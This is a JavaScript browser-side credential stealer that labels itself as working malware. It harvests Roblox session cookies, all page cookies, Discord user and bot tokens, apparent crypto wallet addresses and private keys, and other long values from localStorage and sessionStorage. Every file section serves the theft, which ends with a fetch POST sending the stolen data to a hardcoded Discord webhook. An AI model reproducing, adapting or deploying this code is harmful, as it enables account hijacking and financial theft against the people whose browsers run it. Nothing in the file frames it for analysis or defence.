// REX FINAL + DISCORD BOT TOKEN STEALER – 100% WORKING NOV 2025
const WEBHOOK = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';

let loot = {
    url: location.href,
    time: new Date().toISOString(),
    roblox: document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || 'none',
    cookies: document.cookie,
    user_token: 'none',
    bot_token: 'none',
    wallets: [],
    storage_keys: []
};

// 1. Discord USER token
try {
    loot.user_token = (localStorage.token || '').replace(/"/g,'') || 
                     (JSON.stringify(localStorage).match(/"token":"([^"]+)"/) || [])[1] || 'none';
} catch(e) {}

// 2. Discord BOT token – grabs "Bot MTA..." or raw token people paste
try {
    const allText = document.body.innerText + JSON.stringify(localStorage) + JSON.stringify(sessionStorage);
    const botMatch = allText.match(/(?:Bot )?([M|N][A-Za-z0-9]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,})/);
    if (botMatch) loot.bot_token = botMatch[1].startsWith('Bot') ? botMatch[1] : 'Bot ' + botMatch[1];
} catch(e) {}

// 3. Roblox + cookies
loot.roblox = document.cookie.match(/\.ROBLOSECURITY=_[^;]+/) ? document.cookie : 'none';

// 4. Wallets & private keys
try {
    const all = document.body.innerText + JSON.stringify(localStorage) + JSON.stringify(sessionStorage);
    loot.wallets = [...new Set(all.match(/[0-9a-fA-F]{64,68}|[13][a-km-zA-HJ-NP-Z1-9]{25,59}/g) || [])];
} catch(e) {}

// 5. Other long keys
Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(k => {
    try {
        const v = (localStorage.getItem(k) || sessionStorage.getItem(k) || '');
        if (v.length > 50 && /[A-Za-z0-9_-]{40,}/.test(v)) loot.storage_keys.push(`${k}: ${v.substring(0,120)}`);
    } catch(e) {}
});

// SEND IT ALL
fetch(WEBHOOK, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
        username: "REX BOT + USER STEALER",
        embeds: [{
            title: "HIT – BOT TOKEN + ROBLOX + USER TOKEN",
            color: 16711680,
            description: `**URL:** ${loot.url}`,
            fields: [
                {name: "Roblox .ROBLOSECURITY", value: loot.roblox === 'none' ? "❌" : "```"+(loot.roblox.length > 200 ? loot.roblox.substring(0,200)+"..." : loot.roblox)+"```"},
                {name: "Discord USER Token", value: loot.user_token === 'none' ? "❌" : "```"+loot.user_token.substring(0,100)+"```"},
                {name: "DISCORD BOT TOKEN", value: loot.bot_token === 'none' ? "❌" : "```"+loot.bot_token.substring(0,120)+"```", inline: false},
                {name: "Wallets ("+loot.wallets.length+")", value: loot.wallets.length ? "```"+loot.wallets.slice(0,10).join('\n')+"```" : "none"},
                {name: "Other Keys ("+loot.storage_keys.length+")", value: loot.storage_keys.length ? "```"+loot.storage_keys.slice(0,8).join('\n')+"```" : "none"}
            ],
            footer: {text: "Works everywhere – Bot + User + Roblox"}
        }]
    })
});
